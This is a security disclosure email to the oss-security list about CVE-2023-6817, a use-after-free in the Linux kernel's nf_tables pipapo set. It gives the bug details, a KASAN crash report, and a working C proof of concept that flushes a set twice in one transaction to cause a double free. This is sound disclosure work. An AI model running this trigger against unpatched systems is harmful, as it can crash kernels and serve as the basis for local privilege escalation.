Received: (qmail 30253 invoked by uid 550); 22 Dec 2023 12:21:54 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1453 invoked from network); 22 Dec 2023 02:15:57 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1703211389; x=1703816189; darn=lists.openwall.com;
        h=content-disposition:mime-version:message-id:subject:to:from:date
         :from:to:cc:subject:date:message-id:reply-to;
        bh=TNofHjkVT4FJQxXkpTPPfFPz7x71jTwiACs25sk+1WY=;
        b=crNusRjyomdMXbdZDFd7UBZwR9zEL7VArkyMp2aCPkQNyc0FkZfoHoPUigyXHNL4lN
         IH+pXbFfVeiKKE6y2bjKIKVBslWB34IOa25q3Kz6f02BdTYZkv0eMU/KXFtG1NepQ/ND
         IWBcEnfO0hpz+AWtxNY8M9x47TFRqMvlOyCthMR7hw1AEQtyJgC3Bb8982GJdvug49HQ
         i4jzxxtWsdAVIlb/lLzDwGqHQTk09nVI4xpcuTiv8RIOJWJrmsD73Q6qnXsF4JXWI0Om
         XiUGb2K6Fbbe+A+0WYRc0ohcXrNdhvS6zWk6riOPQdrSRcC3MNCfrszHmhx2RtLkHABe
         /NvA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1703211389; x=1703816189;
        h=content-disposition:mime-version:message-id:subject:to:from:date
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=TNofHjkVT4FJQxXkpTPPfFPz7x71jTwiACs25sk+1WY=;
        b=sz0N4Cuq9VjjBOnF6qF78zPBHlJXQgViD/7ppMFF2bPBOzsszdkTGlR19XiVVg+C07
         FKUY4IL/zjkQII2hmOCKpG/JS6LT3bK6kpwjsGGhDdriFehZrtuoxeWeSwhvQ1TxWsIf
         1zq44cO5vTgk+hZ4IzoTSKRL9dQGx2Kl5WavXk7jgfG2urhaC5jJCQ4DecBmzbW3NTEv
         v6yrod8s08GUkaZVN/QF89ntZbx1tzNS1TIA0LdfgM9ivpg746ENRjhJZfHhc2NC1/xv
         a5ang3zvzfVk1iLOAjnoRTd6GiOMU5JPDBaP/Gt12c+BEQfcEPePISm1HtyYIUPn1Ov+
         sfSA==
X-Gm-Message-State: AOJu0Yw6HWBja+Rw2/kF3wL45KliyLc80pc/lQVcM4yxP4phvxPUTK/g
	i07KoMH3xEab08gco00pkQ0dqnKk/d8p/A==
X-Google-Smtp-Source: AGHT+IHxP9IglMA4lV1ryhf5Kta9O5q4PQhF+oISahNCw3f+hdGU3NPh+CrnUF+Ew8X0RA8Ic3/UVA==
X-Received: by 2002:a05:6808:130c:b0:3b9:e48f:d653 with SMTP id y12-20020a056808130c00b003b9e48fd653mr679081oiv.66.1703211388968;
        Thu, 21 Dec 2023 18:16:28 -0800 (PST)
Date: Fri, 22 Dec 2023 10:16:24 +0800
From: Xingyuan Mo <hdthky0@gmail.com>
To: oss-security@lists.openwall.com
Message-ID: <ZYTxUd61RYu91Sf2@hhost>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="nOwoqXfB+xpz7gga"
Content-Disposition: inline
Subject: [oss-security] CVE-2023-6817: Linux kernel: use-after-free in nf_tables

--nOwoqXfB+xpz7gga
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hello,

I found a use-after-free vulnerability in the implementation of pipapo set
in Linux kernel nf_tables, which can lead to DoS or local privilege
escalation, with CAP_NET_ADMIN capability required. The bug is fixed in
v6.7-rc5 kernel and the patch is:
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=317eb9685095678f2c9f5a8189de698c5354316a

=*=*=*=*=*=*=*=*=  Bug Details  =*=*=*=*=*=*=*=*=
According to the design of nf_tables, when calling NFT_MSG_DELSETELEM
command without a set element specified, all elements in the target set
will be deleted. During this process, nft_set_flush() is called, which
calls set->ops->walk() at (0).

static int nft_set_flush(struct nft_ctx *ctx, struct nft_set *set, u8 genmask)
{
	struct nft_set_iter iter = {
		.genmask	= genmask,
		.fn		= nft_setelem_flush,
	};

	set->ops->walk(ctx, set, &iter);   <==== (0)
	if (!iter.err)
		iter.err = nft_set_catchall_flush(ctx, set);

	return iter.err;
}

If the backend is a pipapo set, nft_pipapo_walk() will be called. This
function does not check the activeness of an element before operating on
it, just like similar functions in other set backend such as
nft_rhash_walk(). Thus NFT_MSG_DELSETELEM command can be called
twice in one transaction to deleted every element in that set twice,
resulting in double free.

A POC is attached, which can be compiled with:
gcc -o poc poc.c -lnftnl -lmnl

I tested against v6.7-rc4 kernel and got a KASAN report as follows:
[  286.833955] ==================================================================
[  286.834580] BUG: KASAN: slab-use-after-free in nf_tables_trans_destroy_work+0x43c/0x630
[  286.835253] Read of size 1 at addr ffff88800754ba88 by task kworker/0:0/8

[  286.835931] CPU: 0 PID: 8 Comm: kworker/0:0 Not tainted 6.7.0-rc4 #1
[  286.836440] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[  286.837167] Workqueue: events nf_tables_trans_destroy_work
[  286.837619] Call Trace:
[  286.837825]  <TASK>
[  286.838005]  dump_stack_lvl+0x3b/0x50
[  286.838316]  print_report+0xcf/0x620
[  286.838621]  ? __virt_addr_valid+0xf7/0x180
[  286.838974]  ? nf_tables_trans_destroy_work+0x43c/0x630
[  286.839397]  ? kasan_complete_mode_report_info+0x80/0x210
[  286.839839]  ? nf_tables_trans_destroy_work+0x43c/0x630
[  286.840269]  kasan_report+0xbd/0x100
[  286.840573]  ? nf_tables_trans_destroy_work+0x43c/0x630
[  286.841001]  __asan_load1+0x66/0x70
[  286.841297]  nf_tables_trans_destroy_work+0x43c/0x630
[  286.841719]  ? __pfx_nf_tables_trans_destroy_work+0x10/0x10
[  286.842175]  ? read_word_at_a_time+0x12/0x20
[  286.842528]  ? kick_pool+0x39/0x1a0
[  286.842829]  process_one_work+0x2e4/0x5c0
[  286.843167]  worker_thread+0x520/0x790
[  286.843491]  ? __pfx_worker_thread+0x10/0x10
[  286.843849]  kthread+0x16e/0x1b0
[  286.844119]  ? __pfx_kthread+0x10/0x10
[  286.844433]  ret_from_fork+0x3b/0x70
[  286.844750]  ? __pfx_kthread+0x10/0x10
[  286.845069]  ret_from_fork_asm+0x1b/0x30
[  286.845400]  </TASK>

[  286.845735] Allocated by task 279:
[  286.846028]  kasan_save_stack+0x2a/0x50
[  286.846352]  kasan_set_track+0x29/0x40
[  286.846669]  kasan_save_alloc_info+0x1f/0x30
[  286.847030]  __kasan_kmalloc+0x88/0xa0
[  286.847344]  __kmalloc+0x61/0x140
[  286.847630]  nft_set_elem_init+0x72/0x270
[  286.847971]  nft_add_set_elem+0xf7b/0x1bb0
[  286.848315]  nf_tables_newsetelem+0x3fb/0x4d0
[  286.848699]  nfnetlink_rcv_batch+0xcba/0xe90
[  286.849055]  nfnetlink_rcv+0x1df/0x220
[  286.849375]  netlink_unicast+0x3eb/0x540
[  286.849703]  netlink_sendmsg+0x44d/0x7d0
[  286.850039]  __sys_sendto+0x347/0x360
[  286.850353]  __x64_sys_sendto+0x7f/0xa0
[  286.850681]  do_syscall_64+0x46/0xf0
[  286.850980]  entry_SYSCALL_64_after_hwframe+0x6f/0x77

[  286.851546] Freed by task 8:
[  286.851795]  kasan_save_stack+0x2a/0x50
[  286.852121]  kasan_set_track+0x29/0x40
[  286.852447]  kasan_save_free_info+0x2f/0x50
[  286.852804]  __kasan_slab_free+0x113/0x1a0
[  286.853155]  __kmem_cache_free+0x82/0x1b0
[  286.853496]  kfree+0x78/0x120
[  286.853752]  nf_tables_trans_destroy_work+0x460/0x630
[  286.854177]  process_one_work+0x2e4/0x5c0
[  286.854513]  worker_thread+0x520/0x790
[  286.854840]  kthread+0x16e/0x1b0
[  286.855113]  ret_from_fork+0x3b/0x70
[  286.855424]  ret_from_fork_asm+0x1b/0x30

[  286.855890] Last potentially related work creation:
[  286.856296]  kasan_save_stack+0x2a/0x50
[  286.856630]  __kasan_record_aux_stack+0x92/0xa0
[  286.857028]  kasan_record_aux_stack_noalloc+0xf/0x20
[  286.857449]  kvfree_call_rcu+0x2c/0x470
[  286.857769]  kernfs_unlink_open_file+0x19c/0x1b0
[  286.858155]  kernfs_fop_release+0x6b/0x180
[  286.858500]  __fput+0x132/0x4e0
[  286.858765]  __fput_sync+0x35/0x40
[  286.859065]  __x64_sys_close+0x56/0xa0
[  286.859390]  do_syscall_64+0x46/0xf0
[  286.859695]  entry_SYSCALL_64_after_hwframe+0x6f/0x77

[  286.860259] The buggy address belongs to the object at ffff88800754ba80
                which belongs to the cache kmalloc-96 of size 96
[  286.861228] The buggy address is located 8 bytes inside of
                freed 96-byte region [ffff88800754ba80, ffff88800754bae0)

[  286.862296] The buggy address belongs to the physical page:
[  286.862745] page:00000000f0d84d4e refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x754b
[  286.863468] anon flags: 0x100000000000800(slab|node=0|zone=1)
[  286.863929] page_type: 0xffffffff()
[  286.864219] raw: 0100000000000800 ffff888004c41780 ffffea00001bcb40 dead000000000005
[  286.864849] raw: 0000000000000000 0000000000200020 00000001ffffffff 0000000000000000
[  286.865451] page dumped because: kasan: bad access detected

[  286.866030] Memory state around the buggy address:
[  286.866412]  ffff88800754b980: 00 00 00 00 00 00 00 00 00 00 04 fc fc fc fc fc
[  286.866977]  ffff88800754ba00: 00 00 00 00 00 00 00 00 00 04 fc fc fc fc fc fc
[  286.867577] >ffff88800754ba80: fa fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
[  286.868185]                       ^
[  286.868489]  ffff88800754bb00: fa fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
[  286.869089]  ffff88800754bb80: fa fb fb fb fb fb fb fb fb fb fb fb fc fc fc fc
[  286.869690] ==================================================================

=*=*=*=*=*=*=*=*=  Discoverer  =*=*=*=*=*=*=*=*=
Xingyuan Mo of IceSword Lab

Best,
Xingyuan Mo

--nOwoqXfB+xpz7gga
Content-Type: text/x-csrc; charset=us-ascii
Content-Disposition: attachment; filename="poc.c"

#define _GNU_SOURCE 1
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stddef.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/mman.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <wait.h>
#include <linux/limits.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/set.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>
#include <libnftnl/object.h>

#define BUF_SIZ 8192
char buf[BUF_SIZ];

struct mnl_socket *setup_env() {
    struct mnl_socket *nl;
    int opt = 1;

    if (unshare(CLONE_NEWUSER | CLONE_NEWNET)) {
        perror("unshare");
        exit(EXIT_FAILURE);
    }

    nl = mnl_socket_open(NETLINK_NETFILTER);
    if (nl == NULL) {
        perror("mnl_socket_open");
        exit(EXIT_FAILURE);
    }

    if (mnl_socket_setsockopt(nl, NETLINK_CAP_ACK, &opt, sizeof(opt)) < 0) {
        perror("mnl_socket_setsockopt");
        exit(EXIT_FAILURE);
    }

    if (mnl_socket_setsockopt(nl, NETLINK_EXT_ACK, &opt, sizeof(opt)) < 0) {
        perror("mnl_socket_setsockopt");
        exit(EXIT_FAILURE);
    }

    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
        perror("mnl_socket_bind");
        exit(EXIT_FAILURE);
    }
    
    return nl;
}

void newtable(struct mnl_nlmsg_batch *batch, int seq, char *name) {
    struct nftnl_table *t;
    struct nlmsghdr *nlh;

    t = nftnl_table_alloc();

    nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, NFPROTO_IPV4);
    nftnl_table_set_u32(t, NFTNL_TABLE_FLAGS, NFT_TABLE_F_DORMANT);
    nftnl_table_set_str(t, NFTNL_TABLE_NAME, name);

    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                    NFT_MSG_NEWTABLE, NFPROTO_IPV4,
                    NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_table_nlmsg_build_payload(nlh, t);
    nftnl_table_free(t);
    mnl_nlmsg_batch_next(batch);
}

void newset(struct mnl_nlmsg_batch *batch, int seq, char *table_name, char *set_name, uint32_t klen, uint32_t flags, uint32_t id, uint32_t policy, bool is_pipapo) {
    struct nftnl_set *s;
    struct nlmsghdr *nlh;

    s = nftnl_set_alloc();
	if (s == NULL) {
		perror("OOM");
        exit(EXIT_FAILURE);
	}

    nftnl_set_set_u32(s, NFTNL_SET_FAMILY, NFPROTO_IPV4);
    nftnl_set_set_str(s, NFTNL_SET_TABLE, table_name);
	nftnl_set_set_str(s, NFTNL_SET_NAME, set_name);
	nftnl_set_set_u32(s, NFTNL_SET_KEY_LEN, klen);
    nftnl_set_set_u32(s, NFTNL_SET_ID, id); // set must have an ID
    if (flags) {
        nftnl_set_set_u32(s, NFTNL_SET_FLAGS, flags);
        if (flags & NFT_SET_OBJECT)
            nftnl_set_set_u32(s, NFTNL_SET_OBJ_TYPE, NFT_OBJECT_COUNTER);
    }
    if (policy)
        nftnl_set_set_u32(s, NFTNL_SET_POLICY, policy);
    if (is_pipapo)
        nftnl_set_set_data(s, 16, &"\x10\x10\x10\x10", 4);

    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
				    NFT_MSG_NEWSET, NFPROTO_IPV4,
				    NLM_F_CREATE | NLM_F_ACK, seq++);
    nftnl_set_nlmsg_build_payload(nlh, s);
    nftnl_set_free(s);
	mnl_nlmsg_batch_next(batch);
}

void newset_pipapo(struct mnl_nlmsg_batch *batch, int seq, char *table_name, char *set_name, uint32_t klen, uint32_t id) {
    newset(batch, seq, table_name, set_name, klen, NFT_SET_INTERVAL|0x80, id, 0, true);
}

void newsetelem(struct mnl_nlmsg_batch *batch, int seq, char *table_name, char *set_name, uint32_t set_id, void *key, uint32_t len_key, void *obj_name, uint32_t udata_size) {
    struct nftnl_set *s;
    struct nftnl_set_elem *se;
    struct nlmsghdr *nlh;

    s = nftnl_set_alloc();
    if (s == NULL) {
		perror("OOM");
        exit(EXIT_FAILURE);
	}

    nftnl_set_set_u32(s, NFTNL_SET_FAMILY, NFPROTO_IPV4);
    nftnl_set_set_str(s, NFTNL_SET_TABLE, table_name);
    if (set_name)
        nftnl_set_set_str(s, NFTNL_SET_NAME, set_name);
    else
        nftnl_set_set_u32(s, NFTNL_SET_ID, set_id);

    se = nftnl_set_elem_alloc();
    if (se == NULL) {
		perror("OOM");
        exit(EXIT_FAILURE);
	}

    nftnl_set_elem_set(se, NFTNL_SET_ELEM_KEY, key, len_key);
    if (obj_name)
        nftnl_set_elem_set_str(se, NFTNL_SET_ELEM_OBJREF, obj_name);
    if (udata_size) {
        void *buf;

        buf = malloc(udata_size);
        nftnl_set_elem_set(se, NFTNL_SET_ELEM_USERDATA, buf, udata_size);
        free(buf);
    }
        

    nftnl_set_elem_add(s, se);

    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWSETELEM, NFPROTO_IPV4,
        NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK, seq++);
    nftnl_set_elems_nlmsg_build_payload(nlh, s);
    mnl_nlmsg_batch_next(batch);    
}

void delsetelem(struct mnl_nlmsg_batch *batch, int seq, char *table_name, char *set_name, void *key, uint32_t len_key) {
    struct nftnl_set *s;
    struct nftnl_set_elem *se;
    struct nlmsghdr *nlh;

    s = nftnl_set_alloc();
    if (s == NULL) {
		perror("OOM");
        exit(EXIT_FAILURE);
	}

    nftnl_set_set_u32(s, NFTNL_SET_FAMILY, NFPROTO_IPV4);
    nftnl_set_set_str(s, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(s, NFTNL_SET_NAME, set_name);

    if (key) {
        se = nftnl_set_elem_alloc();
        if (se == NULL) {
            perror("OOM");
            exit(EXIT_FAILURE);
        }

        nftnl_set_elem_set(se, NFTNL_SET_ELEM_KEY, key, len_key);

        nftnl_set_elem_add(s, se);
    }

    nlh = nftnl_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
        NFT_MSG_DELSETELEM, NFPROTO_IPV4, NLM_F_ACK, seq++);
    nftnl_set_elems_nlmsg_build_payload(nlh, s);
    mnl_nlmsg_batch_next(batch);    
}

void poc()
{
    struct mnl_socket *nl;
    struct nlmsghdr *nlh;
    uint32_t portid, seq, start_seq, end_seq;
    struct mnl_nlmsg_batch *batch;
    int ret;
    uint64_t handle = 0;
    char key[64];

    nl = setup_env();
    
    portid = mnl_socket_get_portid(nl);
    seq = time(NULL);

// ------------------------------------------------------------------------------

    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

// ------------------------------------------------------------------------------

    start_seq = seq;
    newtable(batch, seq++, "poc_table");
    newset_pipapo(batch, seq++, "poc_table", "poc_set", sizeof(key), 0);
    newsetelem(batch, seq++, "poc_table", "poc_set", 0, &key, sizeof(key), NULL, 0);
    end_seq = seq;

// ------------------------------------------------------------------------------

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                  mnl_nlmsg_batch_size(batch)) < 0) {
        perror("mnl_socket_send");
        exit(EXIT_FAILURE);
    }

    mnl_nlmsg_batch_stop(batch);

// ------------------------------------------------------------------------------

    batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

// ------------------------------------------------------------------------------

    start_seq = seq;
    delsetelem(batch, seq++, "poc_table", "poc_set", NULL, sizeof(key));
    delsetelem(batch, seq++, "poc_table", "poc_set", NULL, sizeof(key));
    end_seq = seq;

// ------------------------------------------------------------------------------

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                  mnl_nlmsg_batch_size(batch)) < 0) {
        perror("mnl_socket_send");
        exit(EXIT_FAILURE);
    }

    mnl_nlmsg_batch_stop(batch);

// ------------------------------------------------------------------------------

    mnl_socket_close(nl);

    return;
}

int main() {
    poc();

    return 0;
}


--nOwoqXfB+xpz7gga--
